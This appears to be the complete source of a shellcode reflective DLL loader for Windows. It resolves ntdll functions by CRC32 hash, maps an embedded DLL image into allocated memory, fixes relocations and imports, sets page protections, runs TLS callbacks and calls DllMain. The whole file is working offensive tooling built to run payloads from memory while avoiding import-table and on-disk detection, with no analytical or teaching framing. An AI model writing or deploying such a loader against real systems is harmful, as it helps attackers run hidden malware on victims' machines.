#include "src/h/defs.h"
#include "src/h/dll.h"
#include "src/h/peb.h"

void *mc(void *dest, const void *src, size_t n) {
  char *d = (char *)dest;
  const char *s = (const char *)src;
  while (n--)
    *d++ = *s++;
  return dest;
}

extern "C" {
void __main() {}

void *memset(void *s, int c, size_t n) {
  unsigned char *p = (unsigned char *)s;
  while (n--)
    *p++ = (unsigned char)c;
  return s;
}

size_t strlen(const char *s) {
  size_t len = 0;
  while (*s++)
    len++;
  return len;
}
}

extern "C" void entry() {

  void *p_ntdll = get_ntdll();
  void *p_rtl_init_unicode_string =
      get_proc_address_by_hash(p_ntdll, RtlInitUnicodeString_CRC32b);
  RtlInitUnicodeString *pfn_rtl_init_unicode_string =
      (RtlInitUnicodeString *)p_rtl_init_unicode_string;

  ////////////////////////////////////////////////////////////////////////////
  // 1. DLL shellcode already staged in memory
  ////////////////////////////////////////////////////////////////////////////
  void *dll_bytes = (void *)dll_bin;

  ////////////////////////////////////////////////////////////////////////////
  // 2. Parse PE headers
  ////////////////////////////////////////////////////////////////////////////
  PIMAGE_DOS_HEADER p_dos_header = (PIMAGE_DOS_HEADER)dll_bytes;
  PIMAGE_NT_HEADERS p_nt_headers =
      (PIMAGE_NT_HEADERS)((unsigned long long)dll_bytes + p_dos_header->e_lfanew);
  SIZE_T dll_image_size = p_nt_headers->OptionalHeader.SizeOfImage;

  ////////////////////////////////////////////////////////////////////////////
  // 3. Allocate memory for the mapped image
  ////////////////////////////////////////////////////////////////////////////
  void *dll_base = NULL;
  void *p_nt_allocate_virtual_memory =
      get_proc_address_by_hash(p_ntdll, NtAllocateVirtualMemory_CRC32b);
  NtAllocateVirtualMemory *pfn_nt_allocate_virtual_memory =
      (NtAllocateVirtualMemory *)p_nt_allocate_virtual_memory;

  NTSTATUS nt_status = pfn_nt_allocate_virtual_memory(
      ((HANDLE)-1), &dll_base, 0, &dll_image_size, MEM_COMMIT, PAGE_READWRITE);
  if (nt_status != 0)
    EXIT(-3);

  ////////////////////////////////////////////////////////////////////////////
  // 4. Compute relocation delta and copy headers
  ////////////////////////////////////////////////////////////////////////////
  unsigned long long delta_image_base =
      (unsigned long long)dll_base - p_nt_headers->OptionalHeader.ImageBase;
  mc(dll_base, dll_bytes, p_nt_headers->OptionalHeader.SizeOfHeaders);

  ////////////////////////////////////////////////////////////////////////////
  // 5. Map sections
  ////////////////////////////////////////////////////////////////////////////
  PIMAGE_SECTION_HEADER p_section = IMAGE_FIRST_SECTION(p_nt_headers);
  for (WORD i = 0; i < p_nt_headers->FileHeader.NumberOfSections; i++) {
    void *dest = (PBYTE)dll_base + p_section->VirtualAddress;
    void *src = (PBYTE)dll_bytes + p_section->PointerToRawData;
    if (p_section->SizeOfRawData > 0) {
      mc(dest, src, p_section->SizeOfRawData);
    }
    p_section++;
  }

  ////////////////////////////////////////////////////////////////////////////
  // 6. Apply reloc_dir
  ////////////////////////////////////////////////////////////////////////////
  IMAGE_DATA_DIRECTORY reloc_dir =
      p_nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
  if (reloc_dir.VirtualAddress != 0 && reloc_dir.Size > 0) {
    unsigned long long relocation_table =
        reloc_dir.VirtualAddress + (unsigned long long)dll_base;
    unsigned long cb_relocations_processed = 0;

    while (cb_relocations_processed < reloc_dir.Size) {
      PBASE_RELOCATION_BLOCK p_relocation_block =
          (PBASE_RELOCATION_BLOCK)(relocation_table + cb_relocations_processed);
      cb_relocations_processed += sizeof(BASE_RELOCATION_BLOCK);

      if (p_relocation_block->BlockSize == 0)
        break;

      unsigned long cb_relocations_count =
          (p_relocation_block->BlockSize - sizeof(BASE_RELOCATION_BLOCK)) /
          sizeof(BASE_RELOCATION_ENTRY);
      PBASE_RELOCATION_ENTRY p_relocation_entries =
          (PBASE_RELOCATION_ENTRY)(relocation_table + cb_relocations_processed);

      for (unsigned long i = 0; i < cb_relocations_count; i++) {
        cb_relocations_processed += sizeof(BASE_RELOCATION_ENTRY);
        if (p_relocation_entries[i].Type == 0)
          continue;

        unsigned long long rva_relocation =
            p_relocation_block->PageAddress + p_relocation_entries[i].Offset;
        unsigned long long *p_patch =
            (unsigned long long *)((PBYTE)dll_base + rva_relocation);
        *p_patch += delta_image_base;
      }
    }
  }

  ////////////////////////////////////////////////////////////////////////////
  // 7. Resolve imports via LdrLoadDll + LdrGetProcedureAddress
  ////////////////////////////////////////////////////////////////////////////
  IMAGE_DATA_DIRECTORY import_directory =
      p_nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
  if (import_directory.VirtualAddress != 0) {
    PIMAGE_IMPORT_DESCRIPTOR p_import_descriptor =
        (PIMAGE_IMPORT_DESCRIPTOR)(import_directory.VirtualAddress +
                                   (unsigned long long)dll_base);
    void *h_library = NULL;

    while (p_import_descriptor->Name != 0) {
      void *p_ldr_load_dll =
          get_proc_address_by_hash(p_ntdll, LdrLoadDll_CRC32b);
      char *p_module_name = (char *)dll_base + p_import_descriptor->Name;
      wchar_t w_module_name[MAX_PATH];
      unsigned long cb_converted;

      void *p_rtl_multi_byte_to_unicode_n =
          get_proc_address_by_hash(p_ntdll, RtlMultiByteToUnicodeN_CRC32b);
      RtlMultiByteToUnicodeN *pfn_rtl_multi_byte_to_unicode_n =
          (RtlMultiByteToUnicodeN *)p_rtl_multi_byte_to_unicode_n;

      if ((nt_status = pfn_rtl_multi_byte_to_unicode_n(
               w_module_name, sizeof(w_module_name), &cb_converted,
               p_module_name, strlen(p_module_name) + 1)) != 0x0)
        EXIT(-5);

      UNICODE_STRING import_library_name;
      pfn_rtl_init_unicode_string(&import_library_name, w_module_name);
      LdrLoadDll *pfn_ldr_load_dll = (LdrLoadDll *)p_ldr_load_dll;
      if ((nt_status = pfn_ldr_load_dll(NULL, NULL, &import_library_name,
                                   &h_library)) != 0x0)
        EXIT(-6);

      if (h_library) {
        ANSI_STRING ansi_string;
        PIMAGE_THUNK_DATA p_thunk =
            (PIMAGE_THUNK_DATA)((unsigned long long)dll_base +
                                p_import_descriptor->FirstThunk);
        PIMAGE_THUNK_DATA p_original_thunk =
            (PIMAGE_THUNK_DATA)((unsigned long long)dll_base +
                                p_import_descriptor->OriginalFirstThunk);

        while (p_thunk->u1.AddressOfData != 0) {
          void *p_ldr_get_procedure_address =
              get_proc_address_by_hash(p_ntdll, LdrGetProcedureAddress_CRC32b);
          LdrGetProcedureAddress *pfn_ldr_get_procedure_address =
              (LdrGetProcedureAddress *)p_ldr_get_procedure_address;

          if (IMAGE_SNAP_BY_ORDINAL(p_thunk->u1.Ordinal)) {
            pfn_ldr_get_procedure_address(h_library, NULL,
                                        (WORD)p_original_thunk->u1.Ordinal,
                                        (PVOID *)&(p_thunk->u1.Function));
          } else {
            PIMAGE_IMPORT_BY_NAME p_function_name =
                (PIMAGE_IMPORT_BY_NAME)((unsigned long long)dll_base +
                                        p_thunk->u1.AddressOfData);
            FILL_STRING(ansi_string, p_function_name->Name);
            pfn_ldr_get_procedure_address(h_library, &ansi_string, 0,
                                        (PVOID *)&(p_thunk->u1.Function));
          }
          ++p_thunk;
          if (p_original_thunk)
            ++p_original_thunk;
        }
      }
      p_import_descriptor++;
    }
  }

  ////////////////////////////////////////////////////////////////////////////
  // 8. Set p_section protections
  ////////////////////////////////////////////////////////////////////////////
  PIMAGE_SECTION_HEADER p_section_header = IMAGE_FIRST_SECTION(p_nt_headers);
  for (int i = 0; i < p_nt_headers->FileHeader.NumberOfSections;
       i++, p_section_header++) {
    if (p_section_header->SizeOfRawData || p_section_header->Misc.VirtualSize) {
      unsigned long is_executable =
          (p_section_header->Characteristics & IMAGE_SCN_MEM_EXECUTE) != 0;
      unsigned long is_readable =
          (p_section_header->Characteristics & IMAGE_SCN_MEM_READ) != 0;
      unsigned long is_writeable =
          (p_section_header->Characteristics & IMAGE_SCN_MEM_WRITE) != 0;
      unsigned long page_protect = 0;

      if (!is_executable && !is_readable && !is_writeable)
        page_protect = PAGE_NOACCESS;
      else if (!is_executable && !is_readable && is_writeable)
        page_protect = PAGE_WRITECOPY;
      else if (!is_executable && is_readable && !is_writeable)
        page_protect = PAGE_READONLY;
      else if (!is_executable && is_readable && is_writeable)
        page_protect = PAGE_READWRITE;
      else if (is_executable && !is_readable && !is_writeable)
        page_protect = PAGE_EXECUTE;
      else if (is_executable && !is_readable && is_writeable)
        page_protect = PAGE_EXECUTE_WRITECOPY;
      else if (is_executable && is_readable && !is_writeable)
        page_protect = PAGE_EXECUTE_READ;
      else if (is_executable && is_readable && is_writeable)
        page_protect = PAGE_EXECUTE_READWRITE;

      if (p_section_header->Characteristics & IMAGE_SCN_MEM_NOT_CACHED)
        page_protect |= PAGE_NOCACHE;

      void *p_nt_protect_virtual_memory =
          get_proc_address_by_hash(p_ntdll, NtProtectVirtualMemory_CRC32b);
      NtProtectVirtualMemory *pfn_nt_protect_virtual_memory =
          (NtProtectVirtualMemory *)p_nt_protect_virtual_memory;

      size_t cb_size = p_section_header->Misc.VirtualSize;
      void *p_address = (PBYTE)dll_base + p_section_header->VirtualAddress;
      unsigned long old_protect = 0;

      if ((nt_status =
               pfn_nt_protect_virtual_memory(NtCurrentProcess(), &p_address, &cb_size,
                                           page_protect, &old_protect)) != 0x0)
        EXIT(-7);
    }
  }

  ////////////////////////////////////////////////////////////////////////////
  // 9. Flush instruction cache
  ////////////////////////////////////////////////////////////////////////////
  void *p_nt_flush_instruction_cache =
      get_proc_address_by_hash(p_ntdll, NtFlushInstructionCache_CRC32b);
  NtFlushInstructionCache *pfn_nt_flush_instruction_cache =
      (NtFlushInstructionCache *)p_nt_flush_instruction_cache;
  pfn_nt_flush_instruction_cache((HANDLE)-1, NULL, 0);

  ////////////////////////////////////////////////////////////////////////////
  // 10. Run TLS callbacks
  ////////////////////////////////////////////////////////////////////////////
  IMAGE_DATA_DIRECTORY tls_directory_entry =
      p_nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS];
  if (tls_directory_entry.Size) {
    PIMAGE_TLS_DIRECTORY p_tls_directory =
        (PIMAGE_TLS_DIRECTORY)((unsigned long long)dll_base +
                               tls_directory_entry.VirtualAddress);
    PIMAGE_TLS_CALLBACK *p_tls_callback =
        (PIMAGE_TLS_CALLBACK *)(p_tls_directory->AddressOfCallBacks);
    for (; *p_tls_callback; p_tls_callback++)
      (*p_tls_callback)((LPVOID)dll_base, DLL_PROCESS_ATTACH, NULL);
  }

  ////////////////////////////////////////////////////////////////////////////
  // 11. Call DllMain
  ////////////////////////////////////////////////////////////////////////////
  DLLEntry p_dll_entry =
      (DLLEntry)((unsigned long long)dll_base +
                 p_nt_headers->OptionalHeader.AddressOfEntryPoint);
  (*p_dll_entry)((HINSTANCE)dll_base, DLL_PROCESS_ATTACH, 0);

  ////////////////////////////////////////////////////////////////////////////
  // 12. Cleanup
  ////////////////////////////////////////////////////////////////////////////
  EXIT(0);
}